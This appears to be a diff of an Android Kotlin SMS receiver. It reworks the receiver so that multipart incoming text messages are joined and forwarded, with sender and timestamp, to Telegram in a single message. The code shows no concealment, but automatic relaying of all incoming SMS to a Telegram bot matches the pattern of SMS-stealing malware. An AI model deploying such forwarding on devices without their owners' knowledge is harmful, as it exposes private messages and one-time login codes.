@@ -22,28 +22,32 @@ class SmsReceiver : BroadcastReceiver() {
     override fun onReceive(context: Context?, intent: Intent?) {
         if (context == null || intent?.action != Telephony.Sms.Intents.SMS_RECEIVED_ACTION) return
 
-        // EXTEND RECEIVER LIFETIME (IMPORTANT)
+        // EXTEND RECEIVER LIFETIME
         val pendingResult = goAsync()
 
         CoroutineScope(Dispatchers.IO).launch {
             try {
                 val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
+                if (messages.isEmpty()) return@launch
 
-                messages.forEach { sms ->
-                    val sender = sms.displayOriginatingAddress
-                    val messageBody = sms.messageBody
-                    val date = Date(sms.timestampMillis)
-                    val sdf = SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault())
-                    val formattedDate = sdf.format(date)
+                // Concatenate all parts into one full message
+                val fullMessage = messages.joinToString("") { it.messageBody }
 
-                    val formattedText =
-                        "📩 *New SMS Received*\n\n" +
-                                "*From:* $sender\n" +
-                                "*Date:* $formattedDate\n" +
-                                "*Message:*\n$messageBody"
+                // Use first part's sender and timestamp
+                val sender = messages[0].displayOriginatingAddress ?: "Unknown"
+                val date = Date(messages[0].timestampMillis)
+                val sdf = SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault())
+                val formattedDate = sdf.format(date)
 
-                    sendToTelegram(context, formattedText)
-                }
+                // Prepare Telegram text
+                val formattedText =
+                    "📩 *New SMS Received*\n\n" +
+                            "*From:* $sender\n" +
+                            "*Date:* $formattedDate\n" +
+                            "*Message:*\n$fullMessage"
+
+                // Send once to Telegram
+                sendToTelegram(context, formattedText)
 
             } catch (e: Exception) {
                 Log.e("SmsReceiver", "Error processing SMS", e)
@@ -53,6 +57,7 @@ class SmsReceiver : BroadcastReceiver() {
             }
         }
     }
+
 
     private fun sendToTelegram(context: Context, text: String) {
         val prefs = PrefsManager(context)
